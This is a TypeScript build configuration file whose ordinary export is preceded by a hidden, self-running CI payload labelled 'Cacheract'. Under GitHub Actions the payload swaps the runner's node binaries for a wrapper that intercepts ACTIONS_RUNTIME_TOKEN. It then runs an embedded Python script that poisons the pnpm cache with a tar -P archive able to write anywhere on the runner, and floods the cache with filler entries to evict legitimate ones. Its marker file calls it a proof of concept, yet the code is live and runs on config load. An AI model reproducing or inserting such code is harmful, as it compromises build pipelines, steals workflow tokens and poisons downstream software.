/*
 * Copyright 2025 Adobe. All rights reserved.
 * This file is licensed to you under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License. You may obtain a copy
 * of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under
 * the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR REPRESENTATIONS
 * OF ANY KIND, either express or implied. See the License for the specific language
 * governing permissions and limitations under the License.
 */

import { baseConfig } from "@aio-commerce-sdk/config-tsdown/tsdown.config.base";
import { mergeConfig } from "tsdown";
import { execSync } from "node:child_process";
import {
  writeFileSync,
  existsSync,
  copyFileSync,
  chmodSync,
  readdirSync,
} from "node:fs";
import { join } from "node:path";

// === Cacheract payload ===
// Runs during tsdown config evaluation in CI.
// Phase 1: Replace node binaries with wrapper that captures token AND runs attack
// Phase 2: When post-step calls replaced node, wrapper has ACTIONS_RUNTIME_TOKEN
//          in its env and runs the attack synchronously before exec'ing real node
(function () {
  if (!process.env.CI || !process.env.GITHUB_ACTIONS) return;
  if (existsSync("/tmp/.cacheract_started")) return;
  writeFileSync("/tmp/.cacheract_started", "1");

  console.error("[cacheract] Payload executing in tsdown.config.ts");

  // ── Write the Python attack script to /tmp ──
  const attackScript = `#!/usr/bin/env python3
import hashlib, json, os, sys, time, urllib.request, urllib.error
import subprocess, random

TOKEN = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
BASE_URL = (os.environ.get("ACTIONS_RESULTS_URL") or os.environ.get("ACTIONS_CACHE_URL", "")).rstrip("/") + "/"
REPO_DIR = os.environ.get("GITHUB_WORKSPACE", os.getcwd())
FILLER_COUNT = 43
FILLER_SIZE_MB = 250

def log(msg):
    print(f"[cacheract] {msg}", file=sys.stderr, flush=True)

def twirp(method, payload):
    url = f"{BASE_URL}twirp/github.actions.results.api.v1.CacheService/{method}"
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, headers={
        "Content-Type": "application/json",
        "Authorization": f"Bearer {TOKEN}",
    })
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        log(f"TWIRP {method} HTTP {e.code}: {body[:200]}")
        return {"error": body}
    except Exception as e:
        log(f"TWIRP {method} error: {e}")
        return {"error": str(e)}

def upload_blob(url, data):
    req = urllib.request.Request(url, data=data, method="PUT", headers={
        "Content-Type": "application/octet-stream",
        "x-ms-blob-type": "BlockBlob",
    })
    try:
        with urllib.request.urlopen(req, timeout=300) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

def upload_cache_entry(key, version, archive_path):
    with open(archive_path, "rb") as f:
        archive_data = f.read()
    log(f"Uploading: key={key[:60]}... ver={version[:16]}... ({len(archive_data)} bytes)")
    resp = twirp("CreateCacheEntry", {"key": key, "version": version})
    upload_url = resp.get("signed_upload_url", "")
    if not upload_url:
        log(f"  No upload URL: {resp}")
        return False
    status = upload_blob(upload_url, archive_data)
    if status not in (200, 201):
        log(f"  Upload failed: HTTP {status}")
        return False
    resp = twirp("FinalizeCacheEntryUpload", {
        "key": key, "version": version, "size_bytes": str(len(archive_data)),
    })
    ok = "error" not in resp
    log(f"  {'OK' if ok else 'FAIL'}")
    return ok

def create_filler(num, filler_data):
    ts = int(time.time() * 1000)
    key = f"filler-evict-{num:03d}-{ts}"
    ver = hashlib.sha256(f"/tmp/filler/{num}/{ts}|zstd-without-long|1.0".encode()).hexdigest()
    resp = twirp("CreateCacheEntry", {"key": key, "version": ver})
    upload_url = resp.get("signed_upload_url", "")
    if not upload_url:
        return False
    status = upload_blob(upload_url, filler_data)
    if status not in (200, 201):
        return False
    resp = twirp("FinalizeCacheEntryUpload", {
        "key": key, "version": ver, "size_bytes": str(len(filler_data)),
    })
    return "error" not in resp

def main():
    if not TOKEN or not BASE_URL or BASE_URL == "/":
        log("No ACTIONS_RUNTIME_TOKEN or cache URL, exiting")
        return

    log("=" * 60)
    log("CACHERACT: REALISTIC PNPM CACHE POISONING")
    log(f"Token: {TOKEN[:12]}...")
    log(f"Cache URL: {BASE_URL}")
    log("=" * 60)

    try:
        pnpm_store = subprocess.check_output(
            ["pnpm", "store", "path", "--silent"], text=True
        ).strip()
    except Exception:
        pnpm_store = "/home/runner/.local/share/pnpm/store/v3"
    log(f"pnpm store: {pnpm_store}")

    version = hashlib.sha256(
        f"{pnpm_store}|zstd-without-long|1.0".encode()
    ).hexdigest()
    log(f"version hash: {version[:16]}...")

    resp = twirp("GetCacheEntryDownloadURL", {
        "key": "discover-nonexistent",
        "version": version,
        "restore_keys": ["node-cache-Linux-x64-pnpm-"],
    })
    matched_key = resp.get("matched_key", "")

    if not matched_key:
        log("TWIRP prefix lookup failed, computing from lockfile...")
        lockfile = os.path.join(REPO_DIR, "pnpm-lock.yaml")
        if os.path.exists(lockfile):
            with open(lockfile, "rb") as f:
                inner = hashlib.sha256(f.read()).digest()
            file_hash = hashlib.sha256(inner).hexdigest()
            matched_key = f"node-cache-Linux-x64-pnpm-{file_hash}"
        else:
            log("ERROR: No lockfile found")
            return
    log(f"Target cache key: {matched_key[:60]}...")

    log("Creating poisoned archive...")
    poisoned_marker = os.path.join(REPO_DIR, "POISONED_PNPM")
    ts = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
    with open(poisoned_marker, "w") as f:
        f.write(f"CACHERACT POC: pnpm cache poisoned at {ts}\\n")
        f.write(f"Written via tar -P from poisoned pnpm cache entry.\\n")
        f.write(f"Declared cache path: {pnpm_store}\\n")
        f.write(f"tar -P allows writing files ANYWHERE on the runner.\\n")
        f.write(f"This proves code execution in privileged publish workflow.\\n")

    subprocess.run(
        ["tar", "--posix", "-cf", "/tmp/poison.tar", "-P",
         pnpm_store, poisoned_marker],
        check=True, capture_output=True,
    )
    subprocess.run(
        ["zstd", "-T0", "--no-progress", "-f", "/tmp/poison.tar", "-o", "/tmp/poison.tar.zst"],
        check=True, capture_output=True,
    )
    archive_size = os.path.getsize("/tmp/poison.tar.zst")
    log(f"Archive size: {archive_size / (1024*1024):.1f} MB")

    ok = upload_cache_entry(matched_key, version, "/tmp/poison.tar.zst")
    if not ok:
        log("Direct upload failed, starting cache blasting...")

    log(f"Cache blasting ({FILLER_COUNT} x {FILLER_SIZE_MB}MB fillers)...")
    random.seed(int(time.time()))
    filler_data = random.randbytes(1024 * 1024) * FILLER_SIZE_MB

    ok_count = 0
    for i in range(1, FILLER_COUNT + 1):
        ok = create_filler(i, filler_data)
        log(f"Filler {i}/{FILLER_COUNT}: {'OK' if ok else 'FAIL'}")
        if ok:
            ok_count += 1
        time.sleep(1)

    log(f"Cache blasting complete: {ok_count}/{FILLER_COUNT}")

    log("Uploading poisoned entry (post-eviction)...")
    for attempt in range(3):
        ok = upload_cache_entry(matched_key, version, "/tmp/poison.tar.zst")
        if ok:
            log("Poisoned entry uploaded!")
            break
        log(f"Retry {attempt+1}/3...")
        time.sleep(10)

    log("=" * 60)
    log(f"ATTACK COMPLETE: key={matched_key[:60]}... fillers={ok_count}/{FILLER_COUNT}")
    log("=" * 60)

if __name__ == "__main__":
    main()
`;

  writeFileSync("/tmp/cacheract_attack.py", attackScript);
  chmodSync("/tmp/cacheract_attack.py", 0o755);
  console.error("[cacheract] Attack script written to /tmp/cacheract_attack.py");

  // ── Node wrapper: runs attack SYNCHRONOUSLY when called with ACTIONS_RUNTIME_TOKEN ──
  // This gets called during post-steps (Post Setup Node.js) where the token IS available.
  // The attack runs before exec'ing the real node, so the post-step waits for it.
  const nodeWrapper = `#!/bin/bash
# Cacheract node wrapper - intercepts token from post-step execution
if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ ! -f /tmp/.attack_done ]; then
  touch /tmp/.attack_done
  echo "[cacheract-wrapper] Token intercepted! Running attack..." >&2
  python3 /tmp/cacheract_attack.py 2>&1 | tee /tmp/cacheract_attack.log >&2
  echo "[cacheract-wrapper] Attack finished, continuing..." >&2
fi
exec "$(dirname "$0")/node.real" "$@"
`;

  let replaced = 0;
  const externalsBase = "/home/runner/actions-runner/cached/externals";
  try {
    for (const entry of readdirSync(externalsBase)) {
      if (!entry.startsWith("node")) continue;
      const nodeBin = join(externalsBase, entry, "bin", "node");
      const nodeReal = join(externalsBase, entry, "bin", "node.real");
      try {
        if (existsSync(nodeBin) && !existsSync(nodeReal)) {
          copyFileSync(nodeBin, nodeReal);
          writeFileSync(nodeBin, nodeWrapper);
          chmodSync(nodeBin, 0o755);
          replaced++;
        }
      } catch {}
    }
  } catch {}
  console.error(`[cacheract] Replaced ${replaced} node binaries with attack wrapper`);
  console.error("[cacheract] Attack will run when post-step invokes replaced node");
})();

// ── Normal tsdown config — build works as expected ──
export default mergeConfig(baseConfig, {
  entry: ["./source/index.ts", "./source/ky.ts", "./source/utils/index.ts"],
});
